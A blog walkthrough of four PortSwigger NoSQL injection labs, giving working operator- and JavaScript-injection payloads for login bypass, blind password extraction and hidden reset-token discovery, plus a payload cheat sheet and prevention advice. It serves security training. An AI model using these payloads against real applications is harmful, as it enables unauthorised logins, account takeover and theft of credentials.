---
title: "PortSwigger NoSQL Injection Labs — Complete Walkthrough"
date: 2026-09-22 08:40:00 +0000
categories: [Web Penetration Testing]
tags: [NoSQL Injection, PortSwigger, Web Security Academy, MongoDB]
description: "All 4 PortSwigger NoSQL injection labs: operator injection to bypass login, JavaScript injection detection, blind data extraction, and extracting unknown fields with $where."
author: Paschal Sangawe
toc: true
---

NoSQL databases such as MongoDB are not immune to injection. Two distinct flavours appear in practice:

- **Syntax/operator injection** — you supply a query *object* (e.g. `{"$ne":""}`) where the server expected a string, and the database treats your keys as operators.
- **JavaScript injection** — where the query is built by string concatenation and a `$where`/`mapReduce` clause evaluates JavaScript.

This post covers all **4 PortSwigger NoSQL injection labs**, from login bypass to blind extraction of unknown fields.

{% raw %}

## Lab 1 — Exploiting NoSQL operator injection to bypass authentication
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `{ "username": {"$ne": ""}, "password": "peter" }`.
> _Save as_ `images/portswigger-nosql-injection-labs/1.png` _then replace this block with_ `![Lab 1 — Exploiting NoSQL operator injection to bypass authentication](/images/portswigger-nosql-injection-labs/1.png)`_._


**Difficulty:** Apprentice
**Goal:** Log in as the administrator without a password.

The `POST /login` handler builds a MongoDB query from JSON, so we can inject operators in place of the string values.

1. Send the login request to Repeater.
2. Replace the `username` value with an operator that matches any user:

```json
{ "username": {"$ne": ""}, "password": "peter" }
```

> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `{ "username": {"$ne": ""}, "password": "peter" }`.
> _Save as_ `images/portswigger-nosql-injection-labs/2.png` _then replace this block with_ `![Lab 1 — Exploiting NoSQL operator injection to bypass authentication](/images/portswigger-nosql-injection-labs/2.png)`_._


Login succeeds. The regex operator also works:

```json
{ "username": {"$regex": "wien.*"}, "password": "peter" }
```

> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `{ "username": {"$regex": "wien.*"}, "password": "peter" }`.
> _Save as_ `images/portswigger-nosql-injection-labs/3.png` _then replace this block with_ `![Lab 1 — Exploiting NoSQL operator injection to bypass authentication](/images/portswigger-nosql-injection-labs/3.png)`_._


3. Now target the admin. With `password` set to `{"$ne":""}` the query returns multiple users (an anomaly). Combine it with an admin regex:

```json
{ "username": {"$regex": "admin.*"}, "password": {"$ne": ""} }
```

> **Picture goes here (#4).** Capture this request/response or command step in Burp/terminal. Key line: `{ "username": {"$regex": "admin.*"}, "password": {"$ne": ""} }`.
> _Save as_ `images/portswigger-nosql-injection-labs/4.png` _then replace this block with_ `![Lab 1 — Exploiting NoSQL operator injection to bypass authentication](/images/portswigger-nosql-injection-labs/4.png)`_._


4. This logs you in as the administrator.

> **Picture goes here (#5).** The `{"$regex":"admin.*"}` + `{"$ne":""}` login request and the admin session.
> _Save as_ `images/portswigger-nosql-injection-labs/5.png` _then replace this block with_ `![Lab 1 — Exploiting NoSQL operator injection to bypass authentication](/images/portswigger-nosql-injection-labs/5.png)`_._

**Why it works:** the server passes the JSON straight into the query, so `$ne` / `$regex` change the query's meaning instead of being treated as literal text.

## Lab 2 — Exploiting NoSQL injection to extract data (detection)
> **Picture goes here (#6).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Gifts'+'`.
> _Save as_ `images/portswigger-nosql-injection-labs/6.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/6.png)`_._


**Difficulty:** Apprentice
**Goal:** Detect server-side JavaScript injection and retrieve hidden products.

The product category filter is concatenated into a MongoDB `$where` JavaScript expression.

1. Send the category request to Repeater.
2. A lone `'` produces a **JavaScript syntax error** — a strong hint.
3. A valid JS string join works:

```text
Gifts'+'
```

> **Picture goes here (#7).** Capture this request/response or command step in Burp/terminal. Key line: `Gifts'+'`.
> _Save as_ `images/portswigger-nosql-injection-labs/7.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/7.png)`_._


No error → server-side JS is being evaluated.
4. Boolean probes:

```text
Gifts' && 0 && 'x      → no products (false)
Gifts' && 1 && 'x      → Gifts products (true)
```

> **Picture goes here (#8).** Capture this request/response or command step in Burp/terminal. Key line: `Gifts' && 0 && 'x      → no products (false)`.
> _Save as_ `images/portswigger-nosql-injection-labs/8.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/8.png)`_._


5. Force a true condition to reveal unreleased products:

```text
Gifts'||1||'
```

> **Picture goes here (#9).** Capture this request/response or command step in Burp/terminal. Key line: `Gifts'||1||'`.
> _Save as_ `images/portswigger-nosql-injection-labs/9.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/9.png)`_._


Load the response in the browser to confirm and solve.

> **Picture goes here (#10).** The syntax error, the boolean probes, and `Gifts'||1||'` returning hidden products.
> _Save as_ `images/portswigger-nosql-injection-labs/10.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/10.png)`_._

## Lab 3 — Exploiting NoSQL injection to extract data (blind)
> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `administrator' && this.password.length < 30 || 'a'=='b`.
> _Save as_ `images/portswigger-nosql-injection-labs/11.png` _then replace this block with_ `![Lab 3 — Exploiting NoSQL injection to extract data (blind)](/images/portswigger-nosql-injection-labs/11.png)`_._


**Difficulty:** Practitioner
**Goal:** Extract the administrator's password character by character.

The `GET /user/lookup?user=` endpoint injects into a `$where` clause.

1. Confirm injection: `wiener'+'` returns wiener's details; `wiener' && '1'=='2` returns "Could not find user"; `wiener' && '1'=='1` returns details.
2. Determine the password length:

```text
administrator' && this.password.length < 30 || 'a'=='b
```

> **Picture goes here (#12).** Capture this request/response or command step in Burp/terminal. Key line: `administrator' && this.password.length < 30 || 'a'=='b`.
> _Save as_ `images/portswigger-nosql-injection-labs/12.png` _then replace this block with_ `![Lab 3 — Exploiting NoSQL injection to extract data (blind)](/images/portswigger-nosql-injection-labs/12.png)`_._


Decrease the number until it flips: it is **8** characters.
3. Extract each character with Intruder (Cluster bomb), two payload positions:

```text
administrator' && this.password[§0§]=='§a§
```

> **Picture goes here (#13).** Capture this request/response or command step in Burp/terminal. Key line: `administrator' && this.password[§0§]=='§a§`.
> _Save as_ `images/portswigger-nosql-injection-labs/13.png` _then replace this block with_ `![Lab 3 — Exploiting NoSQL injection to extract data (blind)](/images/portswigger-nosql-injection-labs/13.png)`_._


- Position 1: numbers `0`–`7`.
- Position 2: letters `a`–`z`.
- Sort by payload 1 then response length; the request that returns the administrator's details reveals each character.

4. Log in as administrator with the recovered password.

> **Picture goes here (#14).** The length probe and the Intruder results revealing each character.
> _Save as_ `images/portswigger-nosql-injection-labs/14.png` _then replace this block with_ `![Lab 3 — Exploiting NoSQL injection to extract data (blind)](/images/portswigger-nosql-injection-labs/14.png)`_._

## Lab 4 — Exploiting NoSQL operator injection to extract unknown fields
> **Picture goes here (#15).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`.
> _Save as_ `images/portswigger-nosql-injection-labs/15.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/15.png)`_._


**Difficulty:** Practitioner
**Goal:** Find a hidden password-reset token field and take over Carlos's account.

1. At login, `password` set to `{"$ne":"invalid"}` returns **"Account locked"** — the operator is accepted (Carlos's account is locked, but the injection works).
2. Test `$where` JavaScript evaluation:

```json
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
```

> **Picture goes here (#16).** Capture this request/response or command step in Burp/terminal. Key line: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`.
> _Save as_ `images/portswigger-nosql-injection-labs/16.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/16.png)`_._


→ "Invalid username or password" (false).

```json
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}
```

> **Picture goes here (#17).** Capture this request/response or command step in Burp/terminal. Key line: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}`.
> _Save as_ `images/portswigger-nosql-injection-labs/17.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/17.png)`_._


→ "Account locked" (true). The JavaScript is evaluated.
3. Enumerate the keys on the user object with Intruder (Cluster bomb):

```json
"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
```

> **Picture goes here (#18).** Capture this request/response or command step in Burp/terminal. Key line: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`.
> _Save as_ `images/portswigger-nosql-injection-labs/18.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/18.png)`_._


- Position 1: numbers (0–20).
- Position 2: `a–z`, `A–Z`, `0–9`.
- Responses with "Account locked" spell out the key name. Index 1 is `username`; increment the index (`Object.keys(this)[2]`…) to find a **password reset token** field.
4. Confirm the field name against the reset endpoint: `GET /forgot-password?YOURTOKENNAME=invalid` returns **"Invalid token"**.
5. Extract the token value with Intruder:

```json
"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
```

> **Picture goes here (#19).** Capture this request/response or command step in Burp/terminal. Key line: `"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"`.
> _Save as_ `images/portswigger-nosql-injection-labs/19.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/19.png)`_._


6. Submit it: `GET /forgot-password?YOURTOKENNAME=TOKENVALUE`, change Carlos's password, log in as `carlos`.

> **Picture goes here (#20).** The `$where` true/false probes, the key enumeration, and the recovered reset token.
> _Save as_ `images/portswigger-nosql-injection-labs/20.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/20.png)`_._

**Why it works:** `$where` evaluates attacker-supplied JavaScript in the database, letting you introspect object keys and values even when no data is returned directly.

## NoSQL injection cheat sheet

| Context | Payload |
|---------|---------|
| Login bypass (operator) | `{"username":{"$ne":""},"password":{"$ne":""}}` |
| Login bypass (regex) | `{"username":{"$regex":"admin.*"},"password":{"$ne":""}}` |
| Field discovery | `{"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"}` |
| Value extraction | `{"$where":"this.field.match('^.{§§}§§.*')"}` |
| Boolean (JS) | `' && 1 && 'x` / `' && 0 && 'x` |
| Always-true (JS) | `'||1||'` |
| Length oracle | `' && this.password.length < N || 'a'=='b` |

## Prevention

- **Never** build queries by string concatenation, and never pass raw client JSON into a query. **Cast and validate types** (e.g. force `username`/`password` to strings).
- Reject/ignore query operators in user input: strip keys beginning with `$` and disallow nested objects where a scalar is expected.
- **Disable server-side JavaScript** (`$where`, `mapReduce`, `$function`) unless strictly required; if needed, run with least privilege and time limits.
- Use an ODM/schema validation layer, parameterise queries, and apply least privilege to the database user.
- Add rate limiting and account-lockout handling that does not leak via different error messages.

## Related posts

- [SQL Injection lab series](/posts/portswigger-sqli-part-1-basics/)
- [GraphQL labs](/posts/portswigger-graphql-labs/)
- [JWT labs](/posts/portswigger-jwt-labs/)
- [API Testing labs](/posts/portswigger-api-testing-labs/)

{% endraw %}
